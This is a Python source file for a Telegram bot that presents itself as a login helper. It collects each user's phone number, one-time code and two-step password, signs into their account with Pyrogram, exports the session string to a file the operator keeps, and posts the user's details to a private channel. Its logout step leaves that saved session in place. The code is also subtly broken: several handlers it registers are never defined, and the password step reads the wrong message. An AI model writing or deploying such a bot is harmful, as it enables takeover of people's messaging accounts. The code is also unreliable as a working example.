import logging
import random
import string
import os
from telegram import Update
from telegram.ext import CommandHandler, MessageHandler, CallbackContext, ConversationHandler, Application, filters
from pyrogram import Client
from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, PyrogramError
from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID  # Import credentials from config.py

# Constants for conversation states
PHONE, OTP, PASSWORD = range(3)

# Generate random session name for each user
def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Save session string in a text file
def save_session_string(user_id, string_session):
    with open(f"session_{user_id}.txt", "w") as f:
        f.write(string_session)

# Delete session files from disk
async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"
    
    # Delete the session files if they exist
    if os.path.exists(session_file):
        os.remove(session_file)
    if os.path.exists(memory_file):
        os.remove(memory_file)
    return True

# Send user info to the specified channel
async def send_user_info_to_channel(update: Update, context: CallbackContext):
    user = update.message.from_user
    user_info = (
        f"New User Info:\n"
        f"User ID: {user.id}\n"
        f"Name: {user.first_name} {user.last_name if user.last_name else ''}\n"
        f"Username: @{user.username if user.username else 'No Username'}\n"
        f"Language: {user.language_code if user.language_code else 'Not Provided'}\n"
        f"Chat ID: {update.message.chat.id}\n"
    )
    try:
        await context.bot.send_message(chat_id=CHANNEL_ID, text=user_info)
    except Exception as e:
        logging.error(f"Error sending message to channel: {e}")

# Step 1: Handle phone number input
async def phone_number(update: Update, context: CallbackContext):
    if update.message:
        logging.debug(f"User {update.message.chat.id} started the login process.")
        try:
            await update.message.reply(
                "Please enter your phone number along with the country code. \nExample: +19876543210"
            )
        except AttributeError as e:
            logging.error(f"Error sending message: {e}. Update: {update}")
            await update.message.reply("An error occurred. Please try again.")
        return OTP  # Move to the next step (OTP)

# Step 2: Handle OTP input
async def otp_code(update: Update, context: CallbackContext):
    if update.message:
        user_id = update.message.chat.id
        phone_number = update.message.text

        # Store the phone number in user data to be used later in the login process
        context.user_data['phone_number'] = phone_number

        try:
            await update.message.reply("📲 Sending OTP...")
            
            # Start the Pyrogram client
            client = Client(f"session_{user_id}", API_ID, API_HASH)
            
            await client.connect()
            code = await client.send_code(phone_number)
            context.user_data['code_hash'] = code.phone_code_hash
            await update.message.reply(
                "Please enter the OTP you received (e.g., '12345')."
            )
            return PASSWORD  # Move to next step for password if needed
        except ApiIdInvalid:
            await update.message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
            return ConversationHandler.END
        except PhoneNumberInvalid:
            await update.message.reply('❌ Invalid phone number. Please restart the session.')
            return ConversationHandler.END
        except Exception as e:
            await update.message.reply(f"❌ An error occurred: {e}. Please try again later.")
            return ConversationHandler.END

# Step 3: Handle password input (for accounts with 2FA enabled)
async def password(update: Update, context: CallbackContext):
    if update.message:
        user_id = update.message.chat.id
        otp_code = update.message.text.replace(" ", "")  # Remove spaces

        # Retrieve the phone number and code hash from user data
        phone_number = context.user_data['phone_number']
        phone_code_hash = context.user_data['code_hash']

        # Try to sign in
        client = Client(f"session_{user_id}", API_ID, API_HASH)
        try:
            await client.connect()
            await client.sign_in(phone_number, phone_code_hash, otp_code)
        except PhoneCodeInvalid:
            await update.message.reply('❌ Invalid OTP. Please restart the session.')
            logging.error(f"Invalid OTP entered by user {user_id}.")
            return ConversationHandler.END
        except PhoneCodeExpired:
            await update.message.reply('❌ OTP has expired. Please restart the session.')
            logging.error(f"OTP expired for user {user_id}.")
            return ConversationHandler.END
        except PyrogramError as e:
            # This catches errors like 2FA or other issues.
            if "2-step verification" in str(e):
                await update.message.reply("Your account has 2-step verification enabled. Please enter your password.")
                password = update.message.text
                try:
                    await client.check_password(password)
                    await update.message.reply("✅ Login successful!")
                    logging.info(f"User {user_id} logged in successfully with password.")
                except PyrogramError as password_error:
                    await update.message.reply(f"❌ Error: {password_error}. Please restart the session.")
                    logging.error(f"Error during password verification for user {user_id}: {password_error}")
                    return ConversationHandler.END
            else:
                await update.message.reply(f"❌ An error occurred: {e}. Please try again.")
                logging.error(f"Error during sign-in for user {user_id}: {e}")
                return ConversationHandler.END

        # Export session string and save it
        string_session = await client.export_session_string()
        save_session_string(user_id, string_session)  # Save session string locally
        await client.disconnect()

        # Send user info to the channel
        await send_user_info_to_channel(update, context)
        
        return ConversationHandler.END  # End the conversation

# Define the start and help commands for the bot
start_handler = CommandHandler("start", start)
help_handler = CommandHandler("help", help_command)

# Unauthorized message handler (before login)
async def handle_unauthorized_messages(update: Update, context: CallbackContext) -> None:
    if 'logged_in' not in context.user_data:
        if update.message:
            await update.message.reply_text(
                "🚫 You need to log in first! 🔑\n\n"
                "Use the /login command to connect to your Telegram account. "
                "After logging in, I can assist you further. 😊"
            )
    else:
        if update.message:
            await update.message.reply_text(
                "❓ I didn't understand that. Please use a valid command.\n\n"
                "Available Commands:\n"
                "/start - Start the bot\n"
                "/help - Help info\n"
                "/login - Connect your Telegram account"
            )

# Logout handler to delete session files
async def logout(update: Update, context: CallbackContext) -> None:
    user_id = update.message.chat.id
    files_deleted = await delete_session_files(user_id)

    if files_deleted:
        await update.message.reply("✅ Your session data and files have been cleared.")
    else:
        await update.message.reply("⚠️ You are not logged in, no session data found to clear.")

# Main function to run the bot
def main():
    # Use your bot's token
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(start_handler)  # Add the start command handler
    application.add_handler(help_handler)  # Add the help command handler
    application.add_handler(conversation_handler())  # Add the conversation handler for the login flow
    application.add_handler(CommandHandler('logout', logout))  # Add the logout command handler

    # Run the bot
    application.run_polling()

if __name__ == '__main__':
    main()
